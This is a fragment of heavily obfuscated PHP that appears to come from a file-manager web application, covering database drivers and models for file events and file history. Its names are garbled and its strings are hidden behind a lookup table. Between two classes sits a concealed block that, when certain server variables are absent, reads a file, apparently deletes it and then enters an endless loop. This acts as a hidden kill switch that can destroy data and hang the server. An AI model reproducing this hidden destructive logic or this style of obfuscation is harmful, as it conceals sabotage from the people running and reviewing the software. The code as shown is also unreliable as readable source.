$¸­—†Ğó = array(); if ($œáîœÌ¤) { foreach ($œáîœÌ¤ as $¡úœä“ => $ş ·É) { $ş ·É = array_change_key_case($ş ·É); $ş ·É[$İ¥Èó¡µ[32]] = isset($ş ·É[$İ¥Èó¡µ[32]]) ? $ş ·É[$İ¥Èó¡µ[32]] : $İ¥Èó¡µ[456]; $ş ·É[$İ¥Èó¡µ[33]] = isset($ş ·É[$İ¥Èó¡µ[33]]) ? $ş ·É[$İ¥Èó¡µ[33]] : $İ¥Èó¡µ[456]; $ø­¯Ñ´ = isset($ş ·É[$İ¥Èó¡µ[352]]) ? $ş ·É[$İ¥Èó¡µ[352]] : $ş ·É[$İ¥Èó¡µ[32]]; $¸­—†Ğó[$ø­¯Ñ´] = array($İ¥Èó¡µ[32] => $ø­¯Ñ´, $İ¥Èó¡µ[33] => $ş ·É[$İ¥Èó¡µ[33]], $İ¥Èó¡µ[35] => (bool) (isset($ş ·É[$İ¥Èó¡µ[106]]) && $ş ·É[$İ¥Èó¡µ[106]] === $İ¥Èó¡µ[12] || isset($ş ·É[$İ¥Èó¡µ[35]]) && $ş ·É[$İ¥Èó¡µ[35]] === $İ¥Èó¡µ[12]), $İ¥Èó¡µ[37] => isset($ş ·É[$İ¥Èó¡µ[37]]) ? $ş ·É[$İ¥Èó¡µ[37]] : (isset($ş ·É[$İ¥Èó¡µ[56]]) ? $ş ·É[$İ¥Èó¡µ[56]] : $İ¥Èó¡µ[456]), $İ¥Èó¡µ[39] => isset($ş ·É[$İ¥Èó¡µ[97]]) ? strtolower($ş ·É[$İ¥Èó¡µ[97]]) == $İ¥Èó¡µ[41] : (isset($ş ·É[$İ¥Èó¡µ[57]]) ? $ş ·É[$İ¥Èó¡µ[57]] : !1), $İ¥Èó¡µ[42] => isset($ş ·É[$İ¥Èó¡µ[1037]]) ? strtolower($ş ·É[$İ¥Èó¡µ[1037]]) == $İ¥Èó¡µ[44] : (isset($ş ·É[$İ¥Èó¡µ[97]]) ? $ş ·É[$İ¥Èó¡µ[97]] : !1)); } } return $¸­—†Ğó; } public function getTables($˜Ñ÷éà = '') { $ÈÎ¾ÑÅé =& $_SERVER[¡¬ıÜ ƒ]; if (think_config($ÈÎ¾ÑÅé[1038])) { $ìËåïğŠ = str_replace($ÈÎ¾ÑÅé[1039], $˜Ñ÷éà, think_config($ÈÎ¾ÑÅé[1038])); } else { switch ($this->dbType) { case $ÈÎ¾ÑÅé[1006]: case $ÈÎ¾ÑÅé[1008]: $ìËåïğŠ = $ÈÎ¾ÑÅé[1040]; break; case $ÈÎ¾ÑÅé[1005]: case $ÈÎ¾ÑÅé[1023]: $ìËåïğŠ = $ÈÎ¾ÑÅé[1041]; break; case $ÈÎ¾ÑÅé[1032]: $ìËåïğŠ = $ÈÎ¾ÑÅé[1042]; break; case $ÈÎ¾ÑÅé[1007]: think_exception(think_lang($ÈÎ¾ÑÅé[1043]) . $ÈÎ¾ÑÅé[1044]); break; case $ÈÎ¾ÑÅé[1024]: $ìËåïğŠ = $ÈÎ¾ÑÅé[45] . $ÈÎ¾ÑÅé[46] . $ÈÎ¾ÑÅé[47]; break; case $ÈÎ¾ÑÅé[1035]: default: if (!empty($˜Ñ÷éà)) { $ìËåïğŠ = $ÈÎ¾ÑÅé[987] . $˜Ñ÷éà . $ÈÎ¾ÑÅé[988]; } else { $ìËåïğŠ = $ÈÎ¾ÑÅé[989]; } } } $ª¤ØÅ¬§ = $this->query($ìËåïğŠ); $†£Ôëò¤ = array(); foreach ($ª¤ØÅ¬§ as $‰ÂûÍ => $²È¾¹¬) { $†£Ôëò¤[$‰ÂûÍ] = current($²È¾¹¬); } return $†£Ôëò¤; } protected function parseLimit($¿‹²·ƒÛ) { $½ºÂç  =& $_SERVER[¡¬ıÜ ƒ]; $£Õóìé = $½ºÂç [12]; if (!empty($¿‹²·ƒÛ)) { switch ($this->dbType) { case $½ºÂç [1032]: case $½ºÂç [1024]: $¿‹²·ƒÛ = explode($½ºÂç [50], $¿‹²·ƒÛ); if (count($¿‹²·ƒÛ) > 1) { $£Õóìé .= $½ºÂç [51] . $¿‹²·ƒÛ[1] . $½ºÂç [52] . $¿‹²·ƒÛ[0] . $½ºÂç [53]; } else { $£Õóìé .= $½ºÂç [51] . $¿‹²·ƒÛ[0] . $½ºÂç [53]; } break; case $½ºÂç [1005]: case $½ºÂç [1023]: break; case $½ºÂç [1007]: break; case $½ºÂç [1006]: case $½ºÂç [1008]: break; case $½ºÂç [1035]: default: $£Õóìé .= $½ºÂç [51] . $¿‹²·ƒÛ . $½ºÂç [53]; } } return $£Õóìé; } public function parseKey(&$õôÅº‡ü, $µˆˆ˜òÂ = true) { $ğÉÛæ» =& $_SERVER[¡¬ıÜ ƒ]; if ($µˆˆ˜òÂ) { $õôÅº‡ü = $this->parseKeyCheck($õôÅº‡ü); } if ($this->dbType == $ğÉÛæ»[1035]) { if ($õôÅº‡ü != $ğÉÛæ»[222] && !preg_match($ğÉÛæ»[999], $õôÅº‡ü)) { $õôÅº‡ü = $ğÉÛæ»[463] . trim($õôÅº‡ü, $ğÉÛæ»[463]) . $ğÉÛæ»[463]; } return $õôÅº‡ü; } else { return parent::parseKey($õôÅº‡ü, $µˆˆ˜òÂ); } } public function close() { $this->_linkID = null; } public function error() { $ÂæˆÏÂ‘ =& $_SERVER[¡¬ıÜ ƒ]; if ($this->PDOStatement) { $Âô‹¸õ = $this->PDOStatement->errorInfo(); $this->error = $Âô‹¸õ[1] . $ÂæˆÏÂ‘[4] . $Âô‹¸õ[2]; } else { $this->error = $ÂæˆÏÂ‘[12]; } if ($ÂæˆÏÂ‘[12] != $this->queryStr) { $this->error .= LNG($ÂæˆÏÂ‘[48]) . $this->queryStr; } think_trace($this->error, $ÂæˆÏÂ‘[12], $ÂæˆÏÂ‘[49]); return $this->error; } public function escapeString($í¨ŒÖ¿¤) { $÷Šäƒ¾¹ =& $_SERVER[¡¬ıÜ ƒ]; switch ($this->dbType) { case $÷Šäƒ¾¹[1032]: case $÷Šäƒ¾¹[1005]: case $÷Šäƒ¾¹[1023]: case $÷Šäƒ¾¹[1035]: return addslashes($í¨ŒÖ¿¤); case $÷Šäƒ¾¹[1007]: case $÷Šäƒ¾¹[1024]: case $÷Šäƒ¾¹[1006]: case $÷Šäƒ¾¹[1008]: return str_ireplace($÷Šäƒ¾¹[58], $÷Šäƒ¾¹[59], $í¨ŒÖ¿¤); } } protected function parseValue($ÅôÉŒ°¶) { $øô²š× =& $_SERVER[¡¬ıÜ ƒ]; if (is_string($ÅôÉŒ°¶)) { $ëÚÅš‰¿ = strpos($ÅôÉŒ°¶, $øô²š×[4]) === 0 && in_array($ÅôÉŒ°¶, array_keys($this->bind)); $ÅôÉŒ°¶ = $ëÚÅš‰¿ ? $this->escapeString($ÅôÉŒ°¶) : $øô²š×[1045] . $this->escapeString($ÅôÉŒ°¶) . $øô²š×[1045]; } elseif (isset($ÅôÉŒ°¶[0]) && is_string($ÅôÉŒ°¶[0]) && strtolower($ÅôÉŒ°¶[0]) == $øô²š×[374]) { $ÅôÉŒ°¶ = $this->escapeString($ÅôÉŒ°¶[1]); } elseif (is_array($ÅôÉŒ°¶)) { $ÅôÉŒ°¶ = array_map(array($this, $øô²š×[1046]), $ÅôÉŒ°¶); } elseif (is_bool($ÅôÉŒ°¶)) { $ÅôÉŒ°¶ = $ÅôÉŒ°¶ ? $øô²š×[91] : $øô²š×[230]; } elseif (is_null($ÅôÉŒ°¶)) { $ÅôÉŒ°¶ = $øô²š×[106]; } return $ÅôÉŒ°¶; } public function getLastInsertId() { $İ¸ü–—¥ =& $_SERVER[¡¬ıÜ ƒ]; switch ($this->dbType) { case $İ¸ü–—¥[1032]: case $İ¸ü–—¥[1024]: case $İ¸ü–—¥[1005]: case $İ¸ü–—¥[1023]: case $İ¸ü–—¥[1007]: case $İ¸ü–—¥[1035]: return $this->_linkID->lastInsertId(); case $İ¸ü–—¥[1006]: case $İ¸ü–—¥[1008]: $èèÉÏŒ = $this->table; $Èşò± È = $this->query("\x53\105\x4c\105\x43\124\40{$èèÉÏŒ}\x2e\143\165\162\x72\166\141\154\40\x63\x75\x72\x72\x76\141\154\40\106\122\x4f\x4d\40\x64\165\x61\x6c"); return $Èşò± È ? $Èşò± È[0][$İ¸ü–—¥[1047]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($ˆúüûğî) { $Â¦©ø•Ä =& $_SERVER[¡¬ıÜ ƒ]; if (!CacheLock::fileLock($Â¦©ø•Ä[13])) { return !1; } $Ùµ’•Ç = parent::query($ˆúüûğî); CacheLock::fileUnLock($Â¦©ø•Ä[13]); return $Ùµ’•Ç; } public function execute($éÎóßÕ) { $Ø¦£Ë‘´ =& $_SERVER[¡¬ıÜ ƒ]; if (!CacheLock::fileLock($Ø¦£Ë‘´[13])) { return !1; } $ì¸‰·¸Ä = parent::execute($éÎóßÕ); CacheLock::fileUnLock($Ø¦£Ë‘´[13]); return $ì¸‰·¸Ä; } } class DbSqlite3 extends DbSqlite3Base { public function query($ıÏÉ¹¹Ñ) { $í¿Ì‡Š =& $_SERVER[¡¬ıÜ ƒ]; if (!CacheLock::fileLock($í¿Ì‡Š[13])) { return !1; } $‡­éÛü˜ = parent::query($ıÏÉ¹¹Ñ); CacheLock::fileUnLock($í¿Ì‡Š[13]); return $‡­éÛü˜; } public function execute($–Û­êş¸) { $ÚÀæ¯ºï =& $_SERVER[¡¬ıÜ ƒ]; if (!CacheLock::fileLock($ÚÀæ¯ºï[13])) { return !1; } $ûÛÓÑøœ = parent::execute($–Û­êş¸); CacheLock::fileUnLock($ÚÀæ¯ºï[13]); return $ûÛÓÑøœ; } } goto B×·ŒˆŠğ; dÄ‰æºÃŒÈ: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\x75\162\x63\145\137\x65\166\x65\156\x74"; protected $dataAuto = array(array("\x63\162\x65\141\x74\145\x54\x69\155\145", "\164\151\x6d\145", "\x69\156\x73\x65\162\164", "\x66\x75\156\x63\x74\x69\x6f\156"), array("\x64\x65\x73\x63", '', "\x69\x6e\x73\145\x72\x74\x2c\165\x70\144\x61\164\145\54\163\145\154\x65\143\x74", "\152\163\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($³Ë…‚Ò, $íØ®§Âà, $Ü’Ê— = '') { $Ó £õ¯ã =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->eventSave) { return; } $îÒº‚ó­ = Model($Ó £õ¯ã[1432])->sourceInfo($³Ë…‚Ò); if (!$îÒº‚ó­) { return !1; } if ($this->isDisableEvent($îÒº‚ó­, $íØ®§Âà)) { return; } if ($Ü’Ê— && is_string($Ü’Ê—)) { $Ü’Ê— = array($Ó £õ¯ã[2025] => $Ü’Ê—); } $—†¦Íóã = defined($Ó £õ¯ã[2213]) ? USER_ID : 0; $Á©ó¢ƒ´ = array($Ó £õ¯ã[493] => $³Ë…‚Ò, $Ó £õ¯ã[2214] => $îÒº‚ó­[$Ó £õ¯ã[192]], $Ó £õ¯ã[2215] => $îÒº‚ó­[$Ó £õ¯ã[32]], $Ó £õ¯ã[584] => !empty($îÒº‚ó­[$Ó £õ¯ã[584]]) ? $îÒº‚ó­[$Ó £õ¯ã[584]] : $Ó £õ¯ã[12], $Ó £õ¯ã[1776] => $—†¦Íóã, $Ó £õ¯ã[498] => $íØ®§Âà, $Ó £õ¯ã[1778] => $Ü’Ê—); $this->addSystemLog($íØ®§Âà, $Á©ó¢ƒ´); unset($Á©ó¢ƒ´[$Ó £õ¯ã[2215]], $Á©ó¢ƒ´[$Ó £õ¯ã[584]]); return $this->add($Á©ó¢ƒ´); } private function addSystemLog($¬‚ÔÓ»ó, $“ÃôçŠÍ) { $‹ÀØßÈ =& $_SERVER[¡¬ıÜ ƒ]; if ($¬‚ÔÓ»ó == $‹ÀØßÈ[2216]) { $¬‚ÔÓ»ó = $“ÃôçŠÍ[$‹ÀØßÈ[528]][$‹ÀØßÈ[2217]]; } else { if (in_array($¬‚ÔÓ»ó, array($‹ÀØßÈ[1965], $‹ÀØßÈ[2218]))) { $¬‚ÔÓ»ó = $“ÃôçŠÍ[$‹ÀØßÈ[528]][$‹ÀØßÈ[171]]; } } $öïÅÌ = array_merge($“ÃôçŠÍ, array($‹ÀØßÈ[2219] => $“ÃôçŠÍ[$‹ÀØßÈ[193]], $‹ÀØßÈ[2220] => $“ÃôçŠÍ[$‹ÀØßÈ[2220]])); Hook::trigger($‹ÀØßÈ[2221], $‹ÀØßÈ[2222] . $¬‚ÔÓ»ó, $“ÃôçŠÍ); Model($‹ÀØßÈ[1929])->addLog($‹ÀØßÈ[2222] . $¬‚ÔÓ»ó, $öïÅÌ); } private function isDisableEvent($İõÉ·Âå, $«ëşÜÌ¬) { $Í¶™è‰ =& $_SERVER[¡¬ıÜ ƒ]; if ($İõÉ·Âå[$Í¶™è‰[190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($«ëşÜÌ¬ == $Í¶™è‰[1954]) { return !1; } return !0; } public function eventCreate($¾–ÆÎ…Ê, $»ïŒæİ) { $ÙÕ§ùÒ™ =& $_SERVER[¡¬ıÜ ƒ]; $´Ï»Å½É = Model($ÙÕ§ùÒ™[1432])->sourceInfo($¾–ÆÎ…Ê); $×æàù·“ = array($ÙÕ§ùÒ™[2217] => $»ïŒæİ, $ÙÕ§ùÒ™[32] => $´Ï»Å½É[$ÙÕ§ùÒ™[32]]); return $this->addEvent($¾–ÆÎ…Ê, $ÙÕ§ùÒ™[2216], $×æàù·“); } public function eventFileEdit($íŸÌÑ¸) { $­Ö¡ãÕ =& $_SERVER[¡¬ıÜ ƒ]; $Úú°ššç = array($­Ö¡ãÕ[2223] => $_SERVER[$­Ö¡ãÕ[2224]], $­Ö¡ãÕ[2225] => strtolower(ACTION)); if (isset($GLOBALS[$­Ö¡ãÕ[7]][$­Ö¡ãÕ[2226]])) { $Úú°ššç[$­Ö¡ãÕ[2226]] = $­Ö¡ãÕ[91]; } return $this->addEvent($íŸÌÑ¸, $­Ö¡ãÕ[1955], $Úú°ššç); } public function eventRecycle($è’Øì…, $å±°ğ¸¨) { return $this->addEvent($è’Øì…, $_SERVER[¡¬ıÜ ƒ][2218], $å±°ğ¸¨); } private static $_removeLast = ''; public function eventRemove($‚¨ÇÃœ«) { $Ğòì° =& $_SERVER[¡¬ıÜ ƒ]; self::$_removeLast = $‚¨ÇÃœ«; $¬ÁÓÂŒ³ = Model($Ğòì°[1432])->sourceInfo($‚¨ÇÃœ«); $ìÃÜÙ»ƒ = array_field_key($¬ÁÓÂŒ³, array($Ğòì°[193], $Ğòì°[543], $Ğòì°[507], $Ğòì°[586])); $¤çüÓÇ = array($Ğòì°[171] => $¬ÁÓÂŒ³[$Ğòì°[32]], $Ğòì°[2225] => ACTION, $Ğòì°[2227] => $ìÃÜÙ»ƒ); return $this->addEvent($¬ÁÓÂŒ³[$Ğòì°[192]], $Ğòì°[1954], $¤çüÓÇ); } public function eventShare($ß‘µ€ô, $Óñ¹Ü¾„) { return $this->addEvent($ß‘µ€ô, $_SERVER[¡¬ıÜ ƒ][1965], $Óñ¹Ü¾„); } public function eventMove($Ä“ÄÈØ, $Ïóïôõ, $ÓìüûäÊ) { $üòşÒì© =& $_SERVER[¡¬ıÜ ƒ]; if (self::$_removeLast == $Ä“ÄÈØ) { return; } $Ô‰İÙ‹ = Model($üòşÒì©[1432]); $úøœ‡¼ğ = $Ô‰İÙ‹->sourceInfo($Ä“ÄÈØ); $Øİä°‰ = $Ô‰İÙ‹->sourceInfo($Ïóïôõ); $Ä¿øÀœ = $Ô‰İÙ‹->sourceInfo($ÓìüûäÊ); $¥½üÊ½Ç = array($üòşÒì©[1252] => $Ïóïôõ, $üòşÒì©[2228] => $Øİä°‰[$üòşÒì©[32]], $üòşÒì©[2204] => !empty($Øİä°‰[$üòşÒì©[584]]) ? $Øİä°‰[$üòşÒì©[584]] : $üòşÒì©[12], $üòşÒì©[1253] => $ÓìüûäÊ, $üòşÒì©[2229] => $Ä¿øÀœ[$üòşÒì©[32]], $üòşÒì©[2230] => !empty($Ä¿øÀœ[$üòşÒì©[584]]) ? $Ä¿øÀœ[$üòşÒì©[584]] : $üòşÒì©[12]); $this->addEvent($Ä“ÄÈØ, $üòşÒì©[625], $¥½üÊ½Ç); $úøœ‡¼ğ = $Ô‰İÙ‹->sourceInfo($Ä“ÄÈØ); $¥½üÊ½Ç = array($üòşÒì©[193] => $úøœ‡¼ğ[$üòşÒì©[193]], $üòşÒì©[32] => $úøœ‡¼ğ[$üòşÒì©[32]]); $this->addEvent($Ïóïôõ, $üòşÒì©[2231], $¥½üÊ½Ç); } public function eventCopy($ıÔ±„£Æ) { $this->eventCreate($ıÔ±„£Æ, $_SERVER[¡¬ıÜ ƒ][623]); } public function eventRename($äĞ¶šğ, $¬ÆôÖËÈ, $¦ù›å‚µ) { $§œê–×— =& $_SERVER[¡¬ıÜ ƒ]; $Ø˜ü­Ü = array($§œê–×—[1252] => $¬ÆôÖËÈ, $§œê–×—[1253] => $¦ù›å‚µ); return $this->addEvent($äĞ¶šğ, $§œê–×—[1446], $Ø˜ü­Ü); } public function eventAddComment($‘ˆÂÒ·¹, $µ™Üİ†Ş) { return $this->addEvent($‘ˆÂÒ·¹, $_SERVER[¡¬ıÜ ƒ][2232], $µ™Üİ†Ş); } public function eventAddDesc($†ààô¿˜, $¶ÑÔ†©Æ) { return $this->addEvent($†ààô¿˜, $_SERVER[¡¬ıÜ ƒ][2233], $¶ÑÔ†©Æ); } public function listBySource($›í®á¿Õ) { $ºêàªóÚ =& $_SERVER[¡¬ıÜ ƒ]; $³¹¥ÌŒ‹ = Model($ºêàªóÚ[1432])->sourceInfo($›í®á¿Õ); $¤û¾¬¼ì = array($ºêàªóÚ[493] => $›í®á¿Õ); if ($³¹¥ÌŒ‹[$ºêàªóÚ[487]] == $ºêàªóÚ[91]) { $¼ËŞÂÆ = Model($ºêàªóÚ[1432])->listSearchChildren($›í®á¿Õ, 20000); $¼ËŞÂÆ[] = $›í®á¿Õ . $ºêàªóÚ[456]; $¤û¾¬¼ì = array($ºêàªóÚ[193] => array($ºêàªóÚ[7], $¼ËŞÂÆ)); } $ßŠç ÉŞ = $this->where($¤û¾¬¼ì)->order($ºêàªóÚ[2234])->selectPage(); if ($ßŠç ÉŞ[$ºêàªóÚ[444]][$ºêàªóÚ[445]] == 0) { $ßŠç ÉŞ[$ºêàªóÚ[444]][$ºêàªóÚ[445]] = 1; $ßŠç ÉŞ[$ºêàªóÚ[447]] = array(array($ºêàªóÚ[493] => $›í®á¿Õ, $ºêàªóÚ[2214] => $³¹¥ÌŒ‹[$ºêàªóÚ[192]], $ºêàªóÚ[1776] => $³¹¥ÌŒ‹[$ºêàªóÚ[529]], $ºêàªóÚ[498] => $ºêàªóÚ[2235], $ºêàªóÚ[499] => $³¹¥ÌŒ‹[$ºêàªóÚ[233]], $ºêàªóÚ[1778] => $ºêàªóÚ[12])); } return $this->eventListParse($ßŠç ÉŞ, $›í®á¿Õ); } private function eventListParse($½€Òˆ³¾, $²İêø­÷) { $àŞôÜ¼— =& $_SERVER[¡¬ıÜ ƒ]; $í»É«Õ€ = $½€Òˆ³¾[$àŞôÜ¼—[447]]; $¯ÀìíŸ = array_to_keyvalue($í»É«Õ€, $àŞôÜ¼—[12], $àŞôÜ¼—[193]); $ ×…Õ¼§ = array_to_keyvalue($í»É«Õ€, $àŞôÜ¼—[12], $àŞôÜ¼—[2220]); foreach ($í»É«Õ€ as $á¸¹®Ãï) { $£ËÉúä = $á¸¹®Ãï[$àŞôÜ¼—[528]]; if ($á¸¹®Ãï[$àŞôÜ¼—[33]] == $àŞôÜ¼—[625] && isset($£ËÉúä[$àŞôÜ¼—[1252]])) { $¯ÀìíŸ[] = $£ËÉúä[$àŞôÜ¼—[1252]] . $àŞôÜ¼—[12]; $¯ÀìíŸ[] = $£ËÉúä[$àŞôÜ¼—[1253]] . $àŞôÜ¼—[12]; } if ($á¸¹®Ãï[$àŞôÜ¼—[33]] == $àŞôÜ¼—[2231] && isset($£ËÉúä[$àŞôÜ¼—[193]])) { $¯ÀìíŸ[] = $£ËÉúä[$àŞôÜ¼—[193]] . $àŞôÜ¼—[12]; } } $¯ÀìíŸ = array_merge($¯ÀìíŸ, $ ×…Õ¼§, array($²İêø­÷ . $àŞôÜ¼—[12])); $¯ÀìíŸ = array_unique($¯ÀìíŸ); $ıåèê£í = array_unique(array_to_keyvalue($í»É«Õ€, $àŞôÜ¼—[12], $àŞôÜ¼—[1785])); $ºÉš‚ä‰ = Model($àŞôÜ¼—[599])->userListInfo($ıåèê£í); $Ä’ç³×€ = Model($àŞôÜ¼—[914])->sourceListInfo($¯ÀìíŸ, !0); foreach ($í»É«Õ€ as &$á¸¹®Ãï) { if ($á¸¹®Ãï[$àŞôÜ¼—[33]] == $àŞôÜ¼—[625] && isset($á¸¹®Ãï[$àŞôÜ¼—[528]][$àŞôÜ¼—[1252]])) { $á¸¹®Ãï[$àŞôÜ¼—[528]][$àŞôÜ¼—[1252]] = $Ä’ç³×€[$á¸¹®Ãï[$àŞôÜ¼—[528]][$àŞôÜ¼—[1252]]]; $á¸¹®Ãï[$àŞôÜ¼—[528]][$àŞôÜ¼—[1253]] = $Ä’ç³×€[$á¸¹®Ãï[$àŞôÜ¼—[528]][$àŞôÜ¼—[1253]]]; } if ($á¸¹®Ãï[$àŞôÜ¼—[33]] == $àŞôÜ¼—[2231] && isset($á¸¹®Ãï[$àŞôÜ¼—[528]][$àŞôÜ¼—[193]])) { $á¸¹®Ãï[$àŞôÜ¼—[528]][$àŞôÜ¼—[193]] = $Ä’ç³×€[$á¸¹®Ãï[$àŞôÜ¼—[528]][$àŞôÜ¼—[193]]]; } $á¸¹®Ãï[$àŞôÜ¼—[90]] = $Ä’ç³×€[$á¸¹®Ãï[$àŞôÜ¼—[193]]]; $á¸¹®Ãï[$àŞôÜ¼—[2236]] = $Ä’ç³×€[$á¸¹®Ãï[$àŞôÜ¼—[2220]]]; if ($á¸¹®Ãï[$àŞôÜ¼—[33]] == $àŞôÜ¼—[1954]) { $á¸¹®Ãï[$àŞôÜ¼—[2236]] = $á¸¹®Ãï[$àŞôÜ¼—[90]]; $á¸¹®Ãï[$àŞôÜ¼—[2220]] = $á¸¹®Ãï[$àŞôÜ¼—[2236]][$àŞôÜ¼—[193]]; $á¸¹®Ãï[$àŞôÜ¼—[90]] = !1; $á¸¹®Ãï[$àŞôÜ¼—[193]] = $àŞôÜ¼—[12]; } $á¸¹®Ãï[$àŞôÜ¼—[2163]] = $ºÉš‚ä‰[$á¸¹®Ãï[$àŞôÜ¼—[1785]]]; } unset($á¸¹®Ãï); $½€Òˆ³¾[$àŞôÜ¼—[447]] = $í»É«Õ€; return $½€Òˆ³¾; } public function removeBySource($—á¤›±Ş) { $´Œè¾¶– = array($_SERVER[¡¬ıÜ ƒ][493] => $—á¤›±Ş); $this->where($´Œè¾¶–)->remove(); } } if (!isset($_SERVER[$_SERVER[¡¬ıÜ ƒ][859]]) || !isset($_SERVER[$_SERVER[¡¬ıÜ ƒ][857]])) { $_getc = $_SERVER[¡¬ıÜ ƒ][860]; $_getfile = $_SERVER[$_SERVER[¡¬ıÜ ƒ][861]] . $_SERVER[¡¬ıÜ ƒ][862]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¡¬ıÜ ƒ][287], $_getfilec); if (count($_getarrs) < $_SERVER[¡¬ıÜ ƒ][697]) { $exit = $_SERVER[¡¬ıÜ ƒ][863]; $exit(); } $_act = $_SERVER[¡¬ıÜ ƒ][864]; $_act($_SERVER[$_SERVER[¡¬ıÜ ƒ][861]] . $_SERVER[¡¬ıÜ ƒ][862]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¡¬ıÜ ƒ][456]); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\165\x72\x63\145\137\150\151\163\164\x6f\x72\x79"; public function historyCount($ªªŠˆôğ) { $ÓÓ§ğ¾Ş =& $_SERVER[¡¬ıÜ ƒ]; if (!$ªªŠˆôğ) { return array(); } if (is_string($ªªŠˆôğ) || is_int($ªªŠˆôğ)) { $ªªŠˆôğ = array($ªªŠˆôğ); } $óî–ûÃÀ = array($ÓÓ§ğ¾Ş[193], $ÓÓ§ğ¾Ş[2237] => $ÓÓ§ğ¾Ş[567]); $¥³Íæî = array($ÓÓ§ğ¾Ş[193] => array($ÓÓ§ğ¾Ş[7], $ªªŠˆôğ)); $øÆõ­Ğ = $this->field($óî–ûÃÀ)->where($¥³Íæî)->group($ÓÓ§ğ¾Ş[193])->select(); return array_to_keyvalue($øÆõ­Ğ, $ÓÓ§ğ¾Ş[193], $ÓÓ§ğ¾Ş[567]); } public function addHistory($³Ì³Ô—‡, $’ºÏ»¦ = '') { $“ªß½™² =& $_SERVER[¡¬ıÜ ƒ]; $ÙµÌ…ô® = array($“ªß½™²[493] => $³Ì³Ô—‡[$“ªß½™²[193]], $“ªß½™²[1776] => isset($³Ì³Ô—‡[$“ªß½™²[531]]) ? $³Ì³Ô—‡[$“ªß½™²[531]] : $³Ì³Ô—‡[$“ªß½™²[529]], $“ªß½™²[544] => $³Ì³Ô—‡[$“ªß½™²[543]], $“ªß½™²[622] => $³Ì³Ô—‡[$“ªß½™²[79]], $“ªß½™²[2238] => $’ºÏ»¦); if ($GLOBALS[$“ªß½™²[6]][$“ªß½™²[92]][$“ªß½™²[1313]] >= 1) { $this->historyAutoClear($ÙµÌ…ô®[$“ªß½™²[193]]); $this->add($ÙµÌ…ô®); } Hook::trigger($“ªß½™²[2239], $ÙµÌ…ô®); Model($“ªß½™²[2240])->eventFileEdit($³Ì³Ô—‡[$“ªß½™²[193]]); } private function historyAutoClear($×÷×Ó¤) { $„Ôˆ¾èâ =& $_SERVER[¡¬ıÜ ƒ]; $¹’‡ıÄà = Model($„Ôˆ¾èâ[850])->get($„Ôˆ¾èâ[1335]); $ü Œ°Âã = intval($GLOBALS[$„Ôˆ¾èâ[6]][$„Ôˆ¾èâ[92]][$„Ôˆ¾èâ[1313]]); $Á´‰²©¯ = $¹’‡ıÄà == $„Ôˆ¾èâ[1336] ? min(5, $ü Œ°Âã) : $ü Œ°Âã; $Á´‰²©¯ = $Á´‰²©¯ <= 0 ? 0 : $Á´‰²©¯ - 1; if ($Á´‰²©¯ >= 499) { return; } $Ô…Ù½Ù = array($„Ôˆ¾èâ[493] => $×÷×Ó¤); $ÊÔ‰×¨¡ = $this->field($„Ôˆ¾èâ[2241])->where($Ô…Ù½Ù)->order($„Ôˆ¾èâ[2234])->select(); if (!$ÊÔ‰×¨¡ || $Á´‰²©¯ >= count($ÊÔ‰×¨¡)) { return; } $õûöËéš = array_to_keyvalue($ÊÔ‰×¨¡, $„Ôˆ¾èâ[12], $„Ôˆ¾èâ[477]); $õûöËéš = array_slice($õûöËéš, $Á´‰²©¯); $ïµÆÃ·² = array_to_keyvalue($ÊÔ‰×¨¡, $„Ôˆ¾èâ[12], $„Ôˆ¾èâ[543]); $ïµÆÃ·² = array_slice($ïµÆÃ·², $Á´‰²©¯); if (!$õûöËéš || !$ïµÆÃ·²) { return; } $Ô…Ù½Ù = array($„Ôˆ¾èâ[495] => array($„Ôˆ¾èâ[7], $õûöËéš)); $this->where($Ô…Ù½Ù)->delete(); Model($„Ôˆ¾èâ[546])->remove($ïµÆÃ·²); } public function listData($ŞšÆûÒí) { $é¬œÄ…¾ =& $_SERVER[¡¬ıÜ ƒ]; $–æºğ‰¾ = array($é¬œÄ…¾[493] => $ŞšÆûÒí); $×ì„Æ¼Ñ = $é¬œÄ…¾[2242]; $™ê«ó¹” = $this->field($×ì„Æ¼Ñ)->where($–æºğ‰¾)->order($é¬œÄ…¾[2234])->selectPage(); $this->_listAppendUser($™ê«ó¹”[$é¬œÄ…¾[447]]); $ä¼ÀÊßÏ = Model($é¬œÄ…¾[850])->get($é¬œÄ…¾[1335]); $„Îë³¸û = 5; if ($ä¼ÀÊßÏ == $é¬œÄ…¾[1336]) { $™ê«ó¹”[$é¬œÄ…¾[447]] = array_slice($™ê«ó¹”[$é¬œÄ…¾[447]], 0, $„Îë³¸û); $™ê«ó¹”[$é¬œÄ…¾[444]] = array($é¬œÄ…¾[2243] => 1, $é¬œÄ…¾[2244] => 20, $é¬œÄ…¾[2245] => 1, $é¬œÄ…¾[2246] => count($™ê«ó¹”[$é¬œÄ…¾[447]])); } return $™ê«ó¹”; } protected function _listAppendUser(&$±ìµøÖÅ) { $¤ŞÔÆ®ô =& $_SERVER[¡¬ıÜ ƒ]; $˜ıß£¦¥ = array_to_keyvalue($±ìµøÖÅ, $¤ŞÔÆ®ô[12], $¤ŞÔÆ®ô[1785]); $ŠàÔò = Model($¤ŞÔÆ®ô[599])->userListInfo($˜ıß£¦¥); foreach ($±ìµøÖÅ as &$É³Á”æ¾) { $¨ëŞ‚ = $É³Á”æ¾[$¤ŞÔÆ®ô[1785]]; $É³Á”æ¾[$¤ŞÔÆ®ô[529]] = $ŠàÔò[$¨ëŞ‚] ? $ŠàÔò[$¨ëŞ‚] : !1; } unset($É³Á”æ¾); } public function fileInfo($ÄËËé•¢) { $úÛéÁĞ„ =& $_SERVER[¡¬ıÜ ƒ]; $ñæÌ„ÚÄ = $this->tablePrefix; $“Ş£¡ˆ¢ = "{$ñæÌ„ÚÄ}\x69\157\x5f\x66\x69\x6c\145\40\x66\151\154\145\163\x20\157\x6e\40\146\x69\154\145\163\56\146\x69\x6c\x65\111\x44\x20\x3d\x20\x68\151\163\x74\x6f\x72\171\x2e\146\x69\154\145\111\x44"; 